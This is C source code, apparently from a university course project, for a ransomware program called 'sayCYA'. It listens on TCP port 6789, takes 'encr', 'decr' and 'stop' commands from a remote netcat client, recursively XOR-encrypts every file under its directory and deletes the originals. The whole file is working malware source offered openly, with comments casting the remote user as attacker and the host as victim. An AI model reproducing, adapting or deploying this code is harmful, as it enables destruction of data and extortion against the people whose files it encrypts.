/*
 * PROYECTO: Ransomware
 * CURSO: Lenguaje C y llamadas al sistema
 * 
 * Ransomware sayCYA. Cifra y descifra recursivamente todos los archivos
 *en el directorio donde se encuentre el ejecutable. Se realiza a traves de
 *sockets TCP.
 * En otra terminal o en otra maquina (atacante) con conexion 
 * a la maquina que lo esta ejecutando (victima), realizar la
 * conexion con netcat mediante la ip de la afectada y el 
 * puerto mostrado en este programa.
 * 
 * AUTORES:
 * 			Oscar Espinosa
 * 			Pedro Rodriguez
 * 			Diana Tadeo
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <dirent.h>	//para listar los archivos en el directorio
#include <unistd.h>	//para listar los archivos del directorio
#include <sys/stat.h>	//para saber si un fichero es directorio
#include <sys/types.h>	//para saber si un fichero es directorio
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>  //para usar funcion open
#define BUF_SIZE 4096 // Buffer

//Puerto donde escuchara el socket de la victima
#define PORT 6789
//Longitud de la cadena que almacena direcciones de los archivos
#define length_path 200
#define pad_size 3		//tamano en KB del archivo pad.pad

int otpEncrypt(char n_ifile[], char n_ofile[], char n_pad[]){
	/*
		Funcion que cifra el contenido de n_ifile. El mensaje cifrado
		lo escribe en n_ofile. En n_pad se escribe los caracteres con los
		que se cifro el archivo n_ifile.
		Devuelve 0 si se cifro de manera correcta, -2 si no se pudo
		abrir el archivo n_ifile
	*/
	char c_read, c_pad, c_write;
	//Sockets para el manejo de los archivos.
	//n_ifile debe existir, n_ofile y n_pad se sobreescriben
	FILE *ifile = fopen(n_ifile, "r"), *ofile = fopen(n_ofile, "w+");
	FILE *npad = fopen(n_pad, "r");
	//Si se logra abrir los archivos, comienza el cifrado
	if(ifile != NULL && npad != NULL){
		//Leemos n_ifile hasta llegar al final del archivo
		while ((c_read = fgetc(ifile)) != EOF) {
			if((c_pad = fgetc(npad)) != EOF){
				//XOR del caracter aleatorio y el caracter del archivo a cifrar
				c_write = c_read ^ c_pad;
				fputc(c_write, ofile);	
			}
			else{
				//Se regresa el apuntador al inicio del archivo
				fseek(npad, 0, SEEK_SET);
				c_pad = fgetc(npad);
				//XOR del caracter aleatorio y el caracter del archivo a cifrar
				c_write = c_read ^ c_pad;
				fputc(c_write, ofile);
			}
		}
		//Cierre de los sockets usados
		fclose(ifile);
		fclose(ofile);
		fclose(npad);
		return 0;
	}
	else{
		//Error si no se pudo abrir n_ifile
		return -2;
	}
}

long int getFileSize(char *file){
	/*
		Funcion que obtiene el tamano de un archivo.
		Devuelve este valor.
	*/
	FILE *stream;
	long int len;
	if((stream= fopen(file, "r")) != NULL){
		//Se posiciona al final el apuntador
		fseek(stream, 0, SEEK_END);
		//Se cuentan los bytes
		len = ftell(stream);
		//Se regresa el apuntador al inicio del archivo
		fseek(stream, 0, SEEK_SET);
	}
	fclose(stream);
	return len;
}

int decryptFile(char *cwd, char *file){
	/*
		Funcion que prepara los parametros necesarios
		para poder cifrar el archivo dado como parametro
	*/
	char *outFile = calloc((strlen(file) - 3),sizeof(char));
	strncpy(outFile, file, strlen(file) - 4);
	strcat(outFile, "\0");
	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
	strcat(pad, cwd);
	//El nombre del PAD con el que se cifrara el archivo es
	//[cwd]/pad.pad
	strcat(pad, "/pad.pad\0");
	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
	if (strcmp(file, pad) != 0)
		otpEncrypt(file, outFile, pad);

	free(outFile);
	free(pad);

	return 0;
}

int encryptFile(char *cwd, char *file){
	/*
		Funcion que prepara los parametros necesarios
		para poder cifrar el archivo dado como parametro
	*/
	char *outFile = calloc((strlen(file) + 5),sizeof(char));
	strcat(outFile, file);
	//El archivo cifrado se llamara [file].enc
	strcat(outFile, ".enc\0");
	char *pad = calloc((strlen(cwd) + 9), sizeof(char));
	strcat(pad, cwd);
	//El nombre del PAD con el que se cifrara el archivo es
	//[cwd]/pad.pad
	strcat(pad, "/pad.pad\0");
	//printf("enc:\n");
	//printf("\t%s\n\t%s\n ", file, pad);
	//El archivo pad.pad no se cifrara, por eso se excluye con el condicional
	if (strcmp(file, pad) != 0)
		otpEncrypt(file, outFile, pad);

	free(outFile);
	free(pad);

	return 0;
}

char * getAbsPath(char *current_file, char *dir){
	/*
		Funcion que concatena el directorio de un fichero con el
		nombre del fichero para obtener la ruta absoluta de este.
		Retorna un apuntador a la cadena concatenada
	*/
	int len = strlen(current_file) + strlen(dir);
	//Se suman 2 espacios para el slash y el termino de cadena
	//calloc inicializa en cero el espacio reservado
	char *dest_file = calloc (len + 2,sizeof(char));
	strcat(dest_file, dir);
	strcat(dest_file, "/");
	strcat(dest_file, current_file);
	return dest_file;
}

int makePadFile(char *abs_path){
	/*
		Funcion que genera el archivo PAD con el que se encriptaran
		los archivos dentro de la carpeta respectiva.
	*/
	char c_random;
	int i;
	int smaller = 32, biggest = 126;
	FILE *pad_file;
	char *pad = (char *)calloc(strlen(abs_path) + 9, sizeof(char));
	//Obtenemos el nombre absoluto del archivo
	strcat(pad, abs_path);
	strcat(pad, "/pad.pad\0");
	//Semilla para obtener los caracteres pseudo-aleatoriamente
	srand(time(NULL));
	// Si el archivo exixte en la carpeta no lo creara
		if((pad_file = fopen(pad, "w+")) != NULL){
			for(i = pad_size*1024 - 1; i > 0; i--){
				//Generamos el caracter pseudo-aleatorio
				//Se generan numeros entre smaller y biggest
				c_random = (char) (smaller+(int)(((biggest-smaller+1.0)*rand())/(RAND_MAX+1.0)));
				fputc(c_random, pad_file);
			}
			fputc('\0', pad_file);
			fclose(pad_file);
			free(pad);
			return 0;
		}
	//Si resulta error al abrir el archivo
	free(pad);
	return -1;
}

int getFilesinDir(char *cwd, int opcion){
	/*
		Funcion recursiva que lista todos los ficheros dentro del directorio
		dado como parametro. Cuando un fichero es un archivo comun, se imprime
		su tamano en bytes, cuando es un subdirectorio, se llama de manera
		recursiva a la funcion
	*/
	DIR *d;
    struct dirent *dir;
    char c, abs_path_file[length_path];
    d = opendir(cwd);
    //Si se tiene un apuntador diferente de NULL
    if (d){
    	//Se itera sobre todos los ficheros del directorio
        while ((dir = readdir(d)) != NULL)
        {
			//Si es archivo comun, se llama a encryptFile para encriptarlo
			// Si el tipo de archivo es igual a 8 se trata de un archivo comun
					if (dir->d_type == 8 && dir->d_name[0] != '.'){ // Es un archivo
						if (strcmp(dir->d_name, "pad.pad") != 0) { // Para no agregar el archivo pad.pad
							if (strcmp(dir->d_name, "sayCYA") != 0) { // Para no agregar el archivo sayCYA
								strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
								//printf("sendenc:%s\n%s\n", cwd, abs_path_file);
								if (opcion==1)
									encryptFile(cwd, abs_path_file);
								else if (opcion==2)
									decryptFile(cwd, abs_path_file);
								//Eliminamos el archivo procesado
								remove(abs_path_file);
							}
						}
					}
            //Si es un subdirectorio, se llama de manera recursiva a la funcion con
            //la ruta absoluta del subdirectorio
			// Si el tipo de archivo es igual a 4 se trata de un directorio
			else if (dir->d_type == 4){ // Es un directorio
				if((strcmp(dir->d_name, ".") != 0)?(strcmp(dir->d_name, "..") != 0)?(dir->d_name[0] != '.')?1:0:0:0){
		           	strcpy(abs_path_file, getAbsPath(dir->d_name, cwd));
		           	//printf("\nnew p: %s\n", abs_path_file);
		           	if (opcion == 1)
		           		makePadFile(abs_path_file);
		           	getFilesinDir(abs_path_file,opcion);
	           	}
			}
        }
        closedir(d);
    }
    return 0;
}

int conecta(){
	/*
	   Funcion que mantiene arriba el puerto ya definido para que se pueda
	   realizar el envio de instrucciones mediante el socket.
	  
	   Funciones del protocolo (instrucciones que se pueden enviar): 
	    encr: sirve para cifrar los archivos de forma recursiva
	    decr: sirve para descifrar los archivos de forma recursiva
	    stop: sirve para detener la conexion
	    
	   Una vez realizada la conexion y que se ha mostrado el mensaje de 
	   "Conexion aceptada. Comienza a teclear", se pueden enviar cualquiera
	   de estas 3 opciones, de lo contrario no se realizara ninguna accion.
	*/
	char cwd[length_path];
	getcwd(cwd, (size_t) sizeof(cwd));
	makePadFile(cwd);
	int sockfd, new_sockfd;  // descriptores de archivo
	//Estructura para guardar los datos necesarios para el socket
	struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
	socklen_t sin_size;
	int recv_length=1, yes=1;

	char buffer[6];
	memset(buffer, 0, 6);
	char instr[8];
	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		perror("");
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		perror("");
	//Establece la familia correspondiente al protocolo
	host_addr.sin_family = AF_INET;     //
	//big endian
	host_addr.sin_port = htons(PORT);   //
	host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
	memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s
	//escucha las peticiones.
	if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
		perror("");
	if (listen(sockfd, 5) == -1)
		perror("");
	while(1) {
		sin_size = sizeof(struct sockaddr_in);
		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
		if(new_sockfd == -1)
			perror("");
		send(new_sockfd, "Conexion aceptada. Comienza a teclear\n", 38, 0);
		recv_length = recv(new_sockfd, &buffer, 6, 0);
		while(recv_length > 0) {
			if(strcmp(buffer, "encr\n") == 0){//  command: encr
				send(new_sockfd, "Escogio cifrar\n", 15, 0);
				/*Para descifrar se manda 2 como opcion*/
				getFilesinDir(cwd,1);
			}
			else if(strcmp(buffer, "decr\n") == 0){//  command: decr
				send(new_sockfd, "Escogio descifrar\n", 18, 0);
				/*Para descifrar se manda 2 como opcion*/
				getFilesinDir(cwd,2);
			}
			else if(strcmp(buffer,"stop\n") == 0){//  command: stop
				/*Aqui iria la funcion de  desconectar el socket*/
				send(new_sockfd, "detener todo\n", 13, 0);
				return 1;
			}
			else
				send(new_sockfd, "No se proceso correctamente\n", 28, 0);

			memset(buffer, 0, sizeof(buffer)); //se limpia el buffer
			recv_length = recv(new_sockfd, &buffer, 6, 0);
		}
	close(new_sockfd);
	}
  return 0;
}


int main(){
	int a= conecta();
}
